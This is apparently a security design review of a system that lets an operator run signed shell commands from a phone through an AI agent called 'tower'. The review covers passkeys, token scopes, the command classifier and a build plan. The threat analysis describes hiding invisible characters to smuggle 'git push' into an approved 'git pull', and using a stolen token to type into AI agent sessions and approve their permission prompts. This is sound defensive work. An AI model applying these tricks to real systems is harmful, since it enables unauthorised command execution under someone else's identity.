# run-bang phase 2: security review (mutating `! ` lines from the phone)

Review only (2026-10-21, task `runbang-phase2-review`, session rb-p2review). No code, no pushes, no key
reads. Branch `design/run-bang-p2review` off `design/run-bang` @ 95499cc.

Inputs read: `docs/design/run-bang.md` @ 95499cc (§2, §3, §3.4, §3.5, §4, §6, §9); tower's phase-1
report `tower/reports/run-bang-phase1-2026-10-20.md`; tower `scripts/runbang/{sign,params,runner,
classify,runs,redact}.py` and `scripts/run_bang.py` @ tower main 1d624f4 (run-bang/v2 landed in
1c13094, 53358e8); `scripts/journal.py` (`--sign` rules) and `.claude/skills/ask/SKILL.md`; the
typed-input report `tower/reports/dr-typed/report.md`; deck-remote main @ c9fc0c5 (`main.go`,
`tower.go`, `tower_actions.go`, `tokens.go`, `ask.go`, `askqueue.go`, `approve.go`, `web/app.js`);
the prod launchd plist (flags only). Phase 2 is defined as: `run:mut` cap + one WebAuthn assertion
with Face ID per mutating line (F2 = b), destructive and interactive never, secret stays phase 3.

## 0. Verdict

**No-go on minting `run:mut` today; conditional go once the P0 list in §4 lands.** The run-bang
controls themselves hold up: signing v2 closes the cwd/timeout gap the phase-1 report raised, the
runner is default-deny with a lock, and the passkey design is the right shape. Three things block:

1. **The typed-input path is a weaker parallel route to the same asset.** `POST /api/rc/ask`
   (now `--transport tmux`: the phone's text lands as the operator's own keystrokes), `/approve`,
   `/attention/respond`, `/interrupt` and `/slash` sit behind `s.auth` only (`main.go:303-310`): any
   device token, read-only or not, or the shared token; no act cap, no serve identity, and `bearer()`
   also accepts `?token=` (`main.go:373-379`). A token holder can type "run X" into a worker and
   approve the permission prompt from the same phone. That is operator-uid shell on blackbird with
   less friction than phase 2 will ever grant. It does not bypass run-bang's own checks, but it makes
   §2's stolen-phone blast-radius claim false, and F2 = b buys little while it stands. §1.7, fork F7.
2. **Two passkey details as written would fail or under-bind** (§2.1): "the sign count moved"
   refuses every Apple passkey (iOS reports counter 0), and the enrol-code endpoint "behind
   `authAct` on loopback" is reachable from the tailnet, because `tailscale serve` relays *are*
   loopback peers with the identity header (`tower.go:106-123`). A stolen act bearer could enrol its
   own software passkey.
3. **File-driven mutations** (`bash <script>`, `ansible-playbook`, `kubectl apply -f`, `launchctl
   bootstrap <plist>`) are honest in the signed line but their effect is a file any worker writes by
   design. The signature does not cover that content. They stay laptop-only in phase 2 (§3, F8).

Precondition stated plainly: the prod plist has no `--tower-operator`, so tower actions are off in
prod today. Phase 2 cannot be live-tested until phase 1 (D1 to D4) ships there.

## 1. Threat model delta: mutating execution from a phone

What changes in phase 2 versus §2 of the design, control by control. "Holds" means the design's
control covers it as built or as specified; "gap" is what this review adds.

### 1.1 Stolen or unlocked phone

- **Phase-2 blast radius if run-bang were the only door:** signed, tower-proposed mutating lines,
  each needing Face ID, which the holder cannot produce. Holds, with the §2.1 changes.
- **Gap: the door next to it.** With the PWA open, the composer types as the operator into any
  session (`askqueue.go:51-91`), and `/api/rc/approve` sends `1` + Enter to a permission prompt
  (`approve.go:63`, `cli.go:366-371`). Nothing on that path asks for Face ID. A session running
  with bypass permissions needs no approve at all, and deck-remote cannot tell a session's
  permission mode (no such field in `sessions.go`).
- **Gap: tower as the target.** Text typed into tower's own session is operator speech to tower.
  Tower's `/ask` skill passes `--sign`, and `journal.py` reads the key on behalf of any same-uid
  caller (`journal.py:72-88`, `sign.py:_load`); the caller never handles it. An attacker can
  therefore ask tower, as the operator, to surface a line,
  and that line arrives on the phone signed. Face ID still stands between that line and execution
  for `run:mut`, so run-bang holds; the composer path does not.
- **No app-level lock.** A PWA cannot demand Face ID to open. The token lives in `localStorage`
  (`web/app.js:51-57`). An unlocked phone is a logged-in phone.

### 1.2 Token theft over the tailnet

- Tailnet traffic is WireGuard-encrypted and `tailscale serve` terminates TLS on the laptop; theft
  is from the phone (backup, screenshot of the mint page, `?token=` in a shared URL) or from the
  laptop (`deck-remote-tokens.json` holds hashes only; the shared token is plaintext in
  `~/.agent-deck/web-token`, same uid). Holds for run-bang: `towerActionOK` needs act cap +
  loopback peer + `Tailscale-User-Login == --tower-operator` + header-only bearer
  (`tower.go:133-160`), and `run:mut` adds the passkey, whose private key never leaves the phone's
  Secure Enclave. A stolen bearer alone runs read-only lines only.
- **Gap: the shared token can mint.** `/api/rc/devices/mint` is `authShared` with no origin or
  identity check (`main.go:336`). A shared-token holder anywhere on the tailnet mints an
  `act,run:mut` device token for themselves. The design says the shared token "never has `run:*`";
  it must also not be able to *grant* them remotely. Change in §2.2.
- **Gap: enrolment.** As above: a bearer thief with act cap passes `authAct` from the tailnet and the
  design routes the enrol code through exactly that gate. §2.1.
- The composer and approve endpoints: a stolen read-only token is enough. §1.7.

### 1.3 CSRF and replay

- CSRF: holds. JSON POST with a bearer header; no cookie auth; `sameOrigin` on the proxied paths.
  `bearer()` reading `?token=` is not a CSRF vector (the attacker would need the token) but it is a
  leak vector (referrer logs, screenshots); the run, challenge and assertion endpoints must use
  `bearerHeaderOnly` like the other action endpoints, and the composer/approve endpoints should too.
- Replay of a run: holds. The runner refuses under `state/runs/.lock` on `already-running` or
  `already-done rc=0` for `(ask, item, sha)` (`runner.py:start`, `runs.py:next_attempt`).
- Replay of an assertion: holds as specified (challenge stored per `(ask, item, sha, device)`, 60 s,
  spent on use). Gap: the challenge must also name the credential id and the device-token *id*, and
  the assertion's credential must belong to the token presenting the bearer; otherwise a bearer from
  phone A plus a passkey enrolled by phone B compose. §2.1.
- **Gap: rerun after rc≠0 on a mutating line.** Attempt 2 is allowed by design (new suffix) and
  gets a fresh Face ID, which is right. But a stale `running` (timeout + 60 s, `runs.py:fold`) is
  read as rc −1 while the process may still be alive after a laptop sleep; attempt 2 then runs the
  same mutation concurrently. §2.4.
- Double tap: `towerDup` keys on `(ask, text)` for replies; the run endpoint needs its own
  `(ask, item, sha)` 10 s window in front of the runner so a double tap is a 409, not a journaled
  refusal.

### 1.4 Signed-line substitution

- Edited or transplanted item: holds. `wrong-sha` before anything, then the v2 MAC over
  `(ask id, index, sha, exp, cwd, timeout)` (`sign.py:canonical`), constant-time compare, `expired`,
  `wrong-kid`, `sig-v1` refused, `sig-stale-params` when a later record changed cwd/timeout without
  `--sign`. Tests cover each reason (`test_sign.py`, 24 + the v2 cases).
- **Gap: what the operator saw versus what runs.** The confirm sheet shows text from the overview
  model; the runner re-reads the journal. The sha ties the *text*; nothing ties the *cwd and timeout
  shown* to the ones executed. A re-sign between the sheet and the exec (same uid, so inside the
  stated limit, but also tower's own `resign` or a new `--sign` from `/ask`) yields a valid v2 sig
  with a different cwd. `verify_ask` does not even emit cwd/timeout today (`runner.py:verify_ask`
  fields: index, sha256, class, sig, runnable, why, run). Change: `verify` returns the signed
  `cwd`, `timeout`, `exp` and `kid`; the sheet shows them; the challenge binds the sig MAC; the run
  endpoint passes `--expect-cwd`/`--expect-timeout` and the runner refuses `params-changed`.
- **Gap: invisible characters.** A bidi override or zero-width character inside a verb breaks the
  table lookup and the line falls to `copy` (tested: `git pu​ll` → copy). Inside an argument the
  bytes classify normally while the phone renders them invisibly, so the operator Face-IDs
  `git pull` and runs `git pull && git push origin main`. Both are `mut`, so the class gate does not
  catch it. Change: `classify` returns `copy` for any C0/C1 control (tab excepted), bidi control,
  zero-width or soft-hyphen anywhere in the line (the redactor already strips the same set from
  output, `redact.py:_CTRL`); the sheet renders in monospace with escapes visible.

### 1.5 cwd and env injection

- cwd: closed by v2 (`params.py:workdir` resolves `data.cwd` if an existing absolute dir, else the
  leading `cd <abs>`, else `$HOME`, and the resolved value is what is signed). Residual: `isdir`
  follows symlinks, so a signed path string can point elsewhere after signing (same uid). Cheap
  hardening: sign and compare `os.path.realpath`.
- timeout: closed by v2; `MAX_TIMEOUT` 1800 enforced at resolve time.
- env: holds. `minimal_env` builds from passwd and constants; nothing of deck-remote's env passes;
  `zsh -f` skips rc files. Requirement, not yet a fact: `towerRun` (`tower_actions.go:205-222`)
  sets `cmd.Dir` and never `cmd.Env`, so today's tower actions inherit deck-remote's whole
  environment, and D3 will too unless it execs the runner with an explicit env. `sign.key_path`
  honours `RUN_BANG_KEY` from the runner's own env and `minimal_env` reads `VAULT_ADDR` and `LANG`
  from it. The prod plist sets only `PATH`, so nothing is wrong today; P0 #6 makes it a test.
  `PATH` leads with `/opt/homebrew/bin`, which is user-writable: same-uid residual, accepted.
- **No `SSH_AUTH_SOCK`.** Right for security (smartcard keys would hang waiting for a PIN nobody is
  there to type; on-disk keys would let any phone run use the operator's ssh identity), and it means
  `git push` over ssh and `ssh host 'cmd'` fail with rc≠0 from the phone. `gh` and https remotes
  work via gh's own credential store. Fork F10; recommendation: keep it out.
- **Gap, the one the signature does not cover:** the content of files the line names. A worker
  writes `scripts/deploy.sh` in its checkout (allowed by design), tower's `/ask` surfaces
  `! bash /abs/scripts/deploy.sh` and signs it, the sheet shows an honest line. §3 keeps these
  laptop-only in phase 2.

### 1.6 Tower-key compromise

- The key is a symmetric HMAC secret at `~/.config/tower/run-bang.key`, 0600. Anyone who reads it
  signs; anyone who runs `journal.py --sign` as the operator's uid signs without reading it. The
  design states this (§2, §8). Phase 2 does not change the boundary: a same-uid process can also
  call `run_bang.py run --via phone` directly once `PHASE_RUNNABLE` includes `mut`, skipping
  deck-remote and the passkey entirely. The runner is not the trust anchor; deck-remote's action log
  is. Two consequences for phase 2: the journal's `via: phone` is a caller claim, so (a) every
  phone-mut `running` record should carry the credential id and challenge id deck-remote verified,
  and (b) tower's `/retro` should cross-check journal `via: phone` runs against the action log and
  flag any without a matching line. Rotation (`keygen --rotate`, 7-day grace) is in place.
- Not in scope to fix now: §8's Keychain-ACL helper. Phase 2 does not make it more urgent than it
  was; the typed-input path does, because it is reachable from a phone token, not just from a
  same-uid worker.

### 1.7 The typed-input path: does it bypass what run-bang assumes?

It bypasses nothing *inside* run-bang: signature, class, lock, audit and the passkey all still
gate the run endpoint. It bypasses the **purpose** of F2 = b. Run-bang's §2 says the blast radius of
a stolen unlocked phone is "signed read-only commands tower already proposed". With deck-remote
8cd787e that sentence is false before phase 2 starts:

| step | endpoint | gate today | what it yields |
|---|---|---|---|
| type into any session as the operator | `POST /api/rc/ask` (`--transport tmux`) | `s.auth`: any token, `?token=` ok | the target treats the text as operator speech; no peer-caution footer |
| approve the permission prompt it raises | `POST /api/rc/approve`, `/attention/respond` | `s.auth` | `1` + Enter into the pane: the command runs under the worker's permission mode |
| talk tower into an ask | `POST /api/rc/ask` → tower session | `s.auth` | a signed `! ` line appears on the phone (still needs Face ID to run: holds) |

Compare the run path: act cap + loopback + operator identity + header-only bearer + signed line +
class + Face ID + journal + action log. The two paths lead to the same asset (operator-uid shell on
blackbird and everything the operator's credentials reach). This describes the code at main; whether
the typed transport is live in prod depends on the dr-typed install lines having been run, which the
plist does not show. The honest options are fork F7 in §4.
Minimum for phase 2: the composer, approve, respond, interrupt and slash endpoints adopt the same
`authAct` chain as tower actions (act cap, serve identity, header-only bearer). That removes the
shared-token, read-only-token, LAN-fallback-origin and `?token=` routes but does nothing for a
stolen *unlocked* phone, which holds the act token. Only a passkey on approve/respond (and on sends
to tower's session) closes that one.

## 2. Verdict per control

| control | verdict | concrete change |
|---|---|---|
| Passkey: UV required, origin and `rpIdHash` checks, platform attachment, rpId = tailnet hostname, LAN origin cannot run mut | **sufficient** | none; keep `userVerification: required` on both create and get, and check the UV flag server-side (the library does when asked) |
| Passkey: "sign count moved" | **needs change** | Apple platform passkeys (iCloud Keychain) return `signCount = 0` on every assertion; "moved" refuses all of them. Use clone-detection semantics: refuse only when stored > 0 or new > 0 and new ≤ stored (go-webauthn's `CloneWarning`); log the warning as a refusal reason |
| Passkey: challenge binding | **needs change** | bind the stored challenge to `(ask, item, sha, class, sig MAC, device-token id, credential id)`; single use; 60 s; the assertion's credential must be enrolled under the device token presenting the bearer; the finish handler re-runs `verify` and refuses if the sig MAC changed since the challenge |
| Passkey: enrolment code via `authAct` on loopback | **needs change** | serve-relayed requests are loopback and carry the identity, so a tailnet act bearer passes. Issue the code through a truly local channel: deck-remote writes `<state>/deck-remote-enrol-code` (0600, 5 min) on a loopback request that carries **no** `Tailscale-User-Login` header, or on a CLI subcommand over a unix socket; the TUI reads the file. Register/finish stay behind `authAct` + the code. Add lockout: the code is void after 3 failed finishes (6 digits in 5 min is brute-forceable without it; or use a 128-bit code shown as a QR) |
| Passkey: storage and revoke cascade | **sufficient as specified** | store `{credential id, public key, sign count, device-token id, created}`; revoking the device token deletes its credentials; add a test for the cascade and one that a credential cannot be used with a different token's bearer |
| Passkey: XSS inside the PWA | **residual, document** | 60 `innerHTML` sites with an `esc()` helper, no Content-Security-Policy header, session output is untrusted. A compromised PWA can show line A on the sheet and submit line B; Face ID names the origin, not the command. Both are tower-signed `mut` lines, so the residual is bounded. Cheap hardening: a CSP (no inline script, `connect-src 'self'`) and keep the sheet's DOM built from the `verify` JSON, never from HTML |
| Class caps: `run:ro`, `run:mut`, `run:secret` in `knownCaps`; ceiling is the token, floor is the class | **sufficient with two additions** | (1) `run:mut` implies `run:ro`; the shared token never carries `run:*` (test). (2) Minting any `run:*` cap requires a truly local request (loopback, no serve identity header) or the TUI; `authShared` alone is reachable from the tailnet with the shared token |
| Class caps: runner side | **needs change** | `PHASE_RUNNABLE` is one global set; flipping it opens `mut` for every caller, not per via. Make it per via (`phone: {ro, mut}`, `tui: {ro, mut, interactive, destructive}`), add the phone sub-allowlist from §3 (`laptop-only` refusal reason), and keep the gate flip its own commit |
| Signing v2: cwd/timeout in the canonical string, defaults resolved, stale detection, v1 refused, `resign` | **sufficient** (verified in `sign.py`, `params.py`, `journal.py`; 20 signed asks in the journal, all `v: 2`) | add `realpath` at sign and verify; make `verify` emit `cwd`, `timeout`, `exp`, `kid`; `run` takes `--expect-cwd`/`--expect-timeout` → `params-changed`. Consider a shorter default TTL for asks with `mut` items (12 h) and show "signed N h ago" on the sheet: the line is verified, the world it was proposed for is not |
| Signing: file content named by the line | **missing** | not covered by v2 by design; phase 2 keeps file-driven lines laptop-only (§3); a v3 canonical with `script_sha256` (and the runner hashing the file before exec) is the phase-2.5 path (F8) |
| Classifier | **needs change** | control/bidi/zero-width anywhere → `copy`; reclassify to `destructive`: `git push` with `:ref`/`--delete`/`-d`, `git checkout`/`switch` with `-f`/`--discard-changes` or a pathspec (`--`, `.`), `git restore`, `git reset` (any), `git stash drop`/`clear`, `git worktree remove`/`prune`, `git tag -d`, `kubectl drain`, `rsync --delete`; `kubectl edit` → `interactive` (opens `$EDITOR`). Today `git push origin :old` and `git checkout -- .` are `mut` (tested) |
| Runner lock and rerun guard | **sufficient for concurrency; needs change for stale** | before allowing attempt n+1 over a stale `running`, check the recorded `pgid` for liveness (`killpg(pgid, 0)`), and refuse `still-running` if it answers; journal the liveness result. Also: `mut` default 900 s TERMs an `ansible-playbook` mid-run, which is worse than finishing; `/ask` should set `data.timeout` (signed) for playbooks and the sheet must show it |
| Runner env | **sufficient** | keep `SSH_AUTH_SOCK` out (F10); document that ssh-based pushes fail rc≠0 from the phone |
| Audit: journal `run` records + action log | **sufficient with additions** | phone-mut `running` records carry `auth: {"method": "passkey", "cred": <id8>, "challenge": <id8>}`; the action log records challenge issue, assertion ok/fail with reason and credential id, and every refusal; a `/retro` cross-check that every journal `via: phone` run has a matching action-log line (the `via` field is a caller claim) |
| Confirm sheet | **needs change** | show: verbatim line in monospace with escapes visible, class and phone sub-class, signed cwd and timeout, signature age and kid, attempt number with the previous attempt's rc and tail, and the sentence "runs as you on blackbird with your credentials" (§4.1 asks for it). Copy stays for everything not runnable |
| Composer / approve / respond / interrupt / slash | **missing** (outside run-bang, inside its threat model) | F7; minimum `authAct` chain + header-only bearer |

## 3. Which mutating sub-classes are acceptable from the phone in phase 2

Rule: a line is phone-runnable in phase 2 when its **whole effect is stated in the line**, the
effect is **reversible or convergent**, and it does **not depend on a file a worker can write**.
Everything else in `mut` stays laptop-only (the TUI's y/n path), where the operator can read the
file, resolve a conflict, or type a PIN. The split is enforced in the runner (`laptop-only`
refusal for `--via phone`), not only in deck-remote.

**Phone, phase 2 (mut + Face ID):**

| group | lines | why acceptable |
|---|---|---|
| git, converge and publish | `fetch`, `pull`, `merge` (no `-f`), `switch`/`checkout <branch>` (no `-f`, no pathspec), `push` (no `--force*`, no `:ref`/`--delete`), `commit -m`, `tag` (create), `branch` (create), `worktree add`, `stash` (push/pop), `clone <url> <abs>` | effect in the line; reversible by revert or reflog; a conflict is rc≠0 with a tail and is fixed on the laptop |
| gh | `pr merge`, `pr create`, `pr close` | the hard-rule operator step phase 2 exists for; Face ID is the confirmation; reversible by revert |
| flux | `reconcile`, `resume`, `suspend` | converge or pause of a named object; reversible |
| kubectl | `rollout restart`/`status`, `scale`, inline `patch`, `annotate`, `label`, `cordon`, `uncordon`, `set` | effect in the line; reversible; `scale --replicas=0` is a takedown but reverses the same way |
| launchctl | `kickstart`, `enable` | the deploy ritual; launchd owns the service |
| local UI | `sketchybar --reload`, `skhd` | harmless |
| file state, non-overwriting | `mkdir`, `touch`, `ln -sfn` | effect in the line; `ln -sfn` replaces a symlink only |

**Laptop-only in phase 2 (still `mut`, refused `laptop-only` from the phone):**

| group | lines | why |
|---|---|---|
| opaque code | `bash`/`sh`/`zsh`/`python3`/`node`/`ruby`/`perl <file>`, `source <file>`, `ansible-playbook`, `ansible` | effect is the file's content, which the signature does not cover and the phone cannot show; F8 |
| file-driven service and cluster changes | `kubectl apply -f`, `kubectl create -f`, `kubectl replace`, `flux create`, `launchctl bootstrap`, `load`, `plistbuddy` | same: the manifest or plist is the effect |
| service-stopping | `launchctl disable`, `unload` | takes a service down persistently; the laptop is where it is noticed and undone |
| overwriting file writes | `cp`, `mv`, `tee`, `> redirect`, `sed -i`, `chmod`, `rsync`, `scp` | overwrite or remote write with no backup the line guarantees; revisit with evidence from TUI runs |
| outward writes | `curl` with write flags | arbitrary HTTP write; body is inline but the endpoint's effect is not |
| remote hops | `ssh host '<mut>'` | needs the agent or a PIN; fails from the phone without `SSH_AUTH_SOCK` (F10) |
| rebase | `git rebase` | leaves a mid-rebase state on conflict that cannot be resolved from the phone |

**Reclassified to destructive (never phone):** the git, kubectl and rsync forms listed in §2
(classifier row). **Secret** stays phase 3. **Interactive, destructive, copy** never, unchanged.

Implementation: `classify.py` gains a `phone` boolean per line from a `PHONE_MUT` table
(verb + subcommand + flag exclusions), returned in `verify` output as `phone_ok`; the runner checks
it for `--via phone` and journals `laptop-only`; deck-remote's sheet shows "laptop only" with copy
instead of Run. A `mut` line not in `PHONE_MUT` is laptop-only by default (deny by default, as the
class table is).

## 4. Go/no-go, build list, forks

### Go/no-go

**No-go today.** Conditional **go** for minting `run:mut` on the operator's phone when P0 is merged
and the F7 ruling is recorded. `run:secret` is out of scope and stays off.

### P0 (before any `run:mut` mint)

| # | where | builds | tests |
|---|---|---|---|
| 1 | deck-remote | `POST /api/rc/ask`, `/slash`, `/approve`, `/attention/respond`, `/interrupt` behind `s.auth(s.authAct(...))` with `bearerHeaderOnly`; `?token=` stays for GET/SSE only | matrix: shared token, read-only device token, act token without identity, act token via LAN origin → 403 and one action-log line each; act token via serve → 200; `?token=` on a POST → 403 |
| 2 | tower T1b | classifier: control/bidi/zero-width → `copy`; destructive reclassification (§2 row); `kubectl edit` → interactive; `PHONE_MUT` table and `phone` output | `test_classify`: one fixture per listed form; `git push origin :x`, `git checkout -- .`, `git pu​ll`, `git pull‮ && …` all non-`mut`; every `PHONE_MUT` entry positive, every laptop-only group negative |
| 3 | tower T4b | runner: per-via `PHASE_RUNNABLE`; `laptop-only` refusal; `--expect-cwd`/`--expect-timeout` → `params-changed`; stale-`running` liveness check → `still-running`; `verify` emits `cwd`, `timeout`, `exp`, `kid`, `phone_ok`; `running` data accepts `--auth <json>` (cred id, challenge id); `realpath` on cwd | `test_run_bang`: `--via phone` on a laptop-only `mut` refused and journaled; expected cwd mismatch refused with nothing run; a live pgid behind a stale record refuses attempt 2, a dead one allows it; `verify` shape; auth fields land in the journal |
| 4 | deck-remote D1 | `run:ro`, `run:mut`, `run:secret` in `knownCaps`; `run:mut` implies `run:ro`; mint of any `run:*` only from a truly local request (loopback, no serve identity header) | `tokens_test`: shared token never has `run:*`; remote mint of `run:mut` refused; `hasCap` per class |
| 5 | deck-remote D2 | passkeys per §2: clone-detection sign-count semantics; challenge bound to `(ask, item, sha, class, sig MAC, device-token id, credential id)`, 60 s, single use; credential ↔ device-token binding; enrol code via `<state>/deck-remote-enrol-code` (0600, 5 min) written only for a loopback request without a serve identity header; 3-failure lockout; rate limit on challenge and finish (10/min per token); revoke cascade; action-log lines with credential id | `passkeys_test` with the library's software authenticator: zero sign count accepted, decreasing refused; wrong origin, UV false, spent, expired, other `(ask,item,sha)`, other device token's credential, sig MAC changed since challenge → each refused and logged; enrol code via serve path → 403; 4th wrong code → void; revoke removes credentials |
| 6 | deck-remote D3 | `POST /api/rc/tower/run` (`bearerHeaderOnly`, `authAct`, cap per class, assertion required for `mut`), passes `--expect-cwd`/`--expect-timeout`/`--auth`; execs the runner with an explicit env (`PATH`, `HOME`, `LANG` only: no `RUN_BANG_KEY`, no `DECK_REMOTE_*`, no `VAULT_TOKEN`); `(ask, item, sha)` 10 s dup window → 409; SSE stream and log endpoint per §4.4 | `tower_run_test` with injected `towerExec`: cap × class matrix; `mut` without assertion → 403; hash mismatch → 409; every attempt one action-log line; argv shape includes the expect params; the exec seam asserts the env is exactly the explicit one |
| 7 | deck-remote D4 | confirm sheet per §2 row; "laptop only" state; passkey enrolment in Settings; sheet DOM from `verify` JSON only; CSP header | Playwright against the software-authenticator server: sheet fields present; invisible characters render visibly; a laptop-only line has copy and no Run |
| 8 | tower | gate flip: `PHASE_RUNNABLE["phone"] = {ro, mut}`; own commit, after 1 to 7 are merged and F7 is ruled | the phase-1 refusal test for `class:mut` via phone flips to a phone-ok fixture running and a laptop-only fixture refused |
| 9 | tower + manual | `/retro` cross-check journal `via: phone` ↔ action log; iPhone checklist: Face ID prompt names the tailnet origin; LAN origin shows "mutating needs the tailnet URL"; one `gh pr merge` end to end with the `running` record carrying `auth` | one script test on a fixture journal and log; the manual checklist in the phase-2 report |

Status, order, sizes and the two items the rulings add (#10 for F11, #11 for F12) are in §5.

Prerequisite outside this list: phase 1 (D1 to D4 read-only) deployed to prod with
`--tower-operator` set; it is absent from the plist today.

### P1 (phase 2.5, after the mint)

- v3 canonical with `script_sha256` per named file and the runner hashing the file before exec;
  unfold of the pinned script on the phone; then `bash <file>`, `ansible-playbook`, `kubectl apply
  -f`, `launchctl bootstrap` move to phone-ok (F8 b).
- Passkey on `/approve`, `/attention/respond` and on sends to tower's session (F7 b).
- Keychain-ACL signing helper (§8 a), if a retro shows a worker near `~/.config/tower/`.

### Forks for the operator

| # | decision | options | recommendation |
|---|---|---|---|
| F7 | **The typed-input and approve boundary** | (a) composer, approve, respond, interrupt, slash behind the `authAct` chain with header-only bearer, now; (b) (a) plus a passkey assertion on approve/respond and on sends to tower's session (deck-remote cannot see a worker's permission mode, so bypass-mode workers are covered only by the approve step); (c) accept the act token as the boundary and document Face ID on `run:mut` as defence in depth for the audited path only | **(a) as P0, (b) as P1 before the phase-2 report calls phase 2 done.** (a) is a middleware swap and closes every token-theft route; only (b) answers the stolen unlocked phone. (c) is honest but makes F2 = b cost without benefit |
| F8 | **File-driven mutations from the phone** | (a) laptop-only in phase 2; (b) v3 canonical pins `script_sha256`, runner verifies, phone shows the pinned file; (c) allow as plain `mut` now | **(a) now, (b) as P1.** (c) hands any worker a signed line whose effect it wrote |
| F9 | **Enrol-code channel** | (a) file in the state dir written only for a local client without a serve identity header, read by the TUI; (b) HTTP endpoint that refuses any request carrying `Tailscale-User-Login`; (c) as designed (`authAct` on loopback) | **(a).** (c) is reachable from the tailnet; (b) works but trusts header absence over HTTP |
| F10 | **ssh from the phone** | (a) no `SSH_AUTH_SOCK`; ssh-based `mut` lines laptop-only; `gh`/https pushes work; (b) pass `SSH_AUTH_SOCK` into the runner env | **(a).** (b) lets any phone run use the operator's ssh identity, and smartcard keys hang on a PIN nobody is present to type |
| F11 | **TTL for asks with `mut` items** | (a) keep 24 h, show signature age on the sheet; (b) 12 h default for `mut` asks (`/ask --ttl`), tower re-signs on tick if still open | **(b).** The signature proves the text; it does not prove the branch or cluster is still in the state the line was written for |
| F12 | **Terminal WebSocket auth** (added after the review, session rb-forks) | (a) short-lived ticket: `POST /api/rc/ws/ticket` (header-only bearer, act chain) returns a 30 s single-use ticket bound to device-token id + session id; `/ws/` takes `?ticket=` and refuses `?token=`; (b) keep `?token=` with act + identity as shipped in `ead040b` | **(a).** `/ws/` is a live keyboard into the pane; (b) puts the long-lived act bearer in a URL on every terminal open (§1.3 leak vector) |

### Rulings (operator, 2026-10-21 16:1xZ)

Asked in session rb-forks, answered on the deck-remote card; every ruling is the recommendation.

| # | ruling | consequence in this doc |
|---|---|---|
| F7 | **a** (ruled 13:5xZ, live in deck-remote `ead040b`) | P0 #1 is done; (b) stays P1 before phase 2 is called done |
| F8 | **a** | file-driven `mut` lines refused `laptop-only` from the phone (§3); v3 `script_sha256` pinning stays P1 (phase 2.5) |
| F9 | **a** | enrol code only via `<state>/deck-remote-enrol-code` (0600, 5 min), written for a loopback request without a serve identity header, read by the TUI (P0 #5) |
| F10 | **a** | runner env keeps `SSH_AUTH_SOCK` out; `ssh host …` lines laptop-only; ssh-remote pushes fail rc≠0 from the phone, `gh`/https work (P0 #3, documented on the sheet) |
| F11 | **b** | `/ask` signs asks with any `mut` item at 12 h; tower re-signs still-open ones on tick; the sheet shows signature age and proposal age (P0 #10) |
| F12 | **a** | `/ws/` moves from `?token=` to a 30 s single-use ticket (P0 #11) |

## 5. Build plan (P0 + rulings; ordered; not started)

Status checked 2026-10-21 against deck-remote main 4dafff9 and tower main 4490cbd. Sizes: S ≤ half a
day, M about a day, L two or more. Owner = the repo the work lands in; one session per repo can
take each wave.

| order | # | repo | builds | tests | size | status |
|---|---|---|---|---|---|---|
| — | 1 | deck-remote | typed-input endpoints behind the act chain, header-only | `typed_test.go`, `web/typed.test.js` | — | **done** `ead040b` |
| W1 | 2 | tower | classifier: C0/C1 (tab excepted), bidi, zero-width, soft hyphen anywhere → `copy`; destructive reclassification (§2 classifier row); `kubectl edit` → interactive; `PHONE_MUT` table (§3) with `phone` per line, deny by default; `ssh` and every §3 laptop-only group negative | `test_classify`: one fixture per listed form; `git push origin :x`, `git checkout -- .`, `git pu​ll`, `git pull‮ && …` all non-`mut`; every `PHONE_MUT` entry positive, every laptop-only group (incl. F8's file-driven and F10's `ssh`) negative | M | not built |
| W1 | 3 | tower | runner: per-via `PHASE_RUNNABLE` (`phone: {ro}` still, `tui: …`), `laptop-only` refusal for `--via phone` when `phone_ok` is false; `verify` emits `cwd`, `timeout`, `exp`, `kid`, `phone_ok`; `run --expect-cwd/--expect-timeout` → `params-changed`; `realpath` on cwd at sign and verify; stale `running` → `killpg(pgid, 0)` → `still-running`; `running` data takes `--auth <json>`; `SSH_AUTH_SOCK` absence asserted (F10) | `test_run_bang`: laptop-only `mut` via phone refused + journaled; cwd mismatch refused, nothing run; live pgid behind stale record refuses attempt 2, dead one allows; `verify` JSON shape; auth fields in the `running` record; `minimal_env` has no `SSH_AUTH_SOCK`; symlinked cwd signs its realpath | M | not built |
| W1 | 10 | tower | F11: `/ask` skill passes `--ttl 43200` when any item classifies `mut`; `/tick` re-signs (`run_bang.py resign --ttl 43200`) open `mut` asks with < 2 h left | script test on a fixture journal: `mut` ask signed with exp = ts + 12 h, `ro`-only ask keeps 24 h; tick re-signs an open ask near expiry and leaves an answered one alone | S | not built (`--ttl` and `resign` exist) |
| W1 | 4 | deck-remote | caps: `run:mut` implies `run:ro` in `hasCap`; mint/revoke of any `run:*` only from a truly local request (loopback peer, no `Tailscale-User-Login`), else 403; shared token never carries `run:*` | `tokens_test`: implication per class; shared token has no `run:*`; serve-relayed mint of `run:mut` with the shared token → 403 + action-log line; local mint → 200 | S | partial: caps known (`tokens.go:62`), no implication, mint is `authShared` (`main.go:341`) |
| W1 | 11 | deck-remote | F12: `POST /api/rc/ws/ticket {session}` behind `authAct` + `bearerHeaderOnly` → 32-byte random ticket, 30 s, single use, bound to device-token id + session id, in memory; `/ws/` accepts `?ticket=` only and refuses `?token=`; `terminal.html` fetches a ticket with the header before each connect/reconnect; action-log line per issue and per refusal | `ws_ticket_test`: valid ticket upgrades once, second use 403; expired 403; ticket for session A on session B 403; `?token=` on `/ws/` 403; ticket mint with a read-only or shared token 403; revoking the device token voids its open tickets; `web/` test that `terminal.html` never puts `token=` in the WS URL | S | not built |
| W2 | 5 | deck-remote | passkeys (go-webauthn): register/finish behind `authAct` + enrol code; F9 code file `<state>/deck-remote-enrol-code` (0600, 5 min) written only for loopback without serve identity, void after 3 failed finishes; storage `{cred id, pubkey, sign count, device-token id, created}`; clone-detection sign count (0/0 ok, refuse when either > 0 and new ≤ stored); challenge bound to `(ask, item, sha, class, sig MAC, device-token id, cred id)`, 60 s, single use; credential must belong to the presenting token; 10/min rate limit on challenge and finish; revoke cascade; `userVerification: required` checked server-side | `passkeys_test` with the library's software authenticator: zero sign count accepted, decreasing refused; wrong origin, UV false, spent, expired, other `(ask,item,sha)`, other token's credential, sig MAC changed since challenge → each refused + logged; enrol code request via serve → 403; 4th wrong code → void; revoke removes credentials; 11th challenge in a minute → 429 | L | not built |
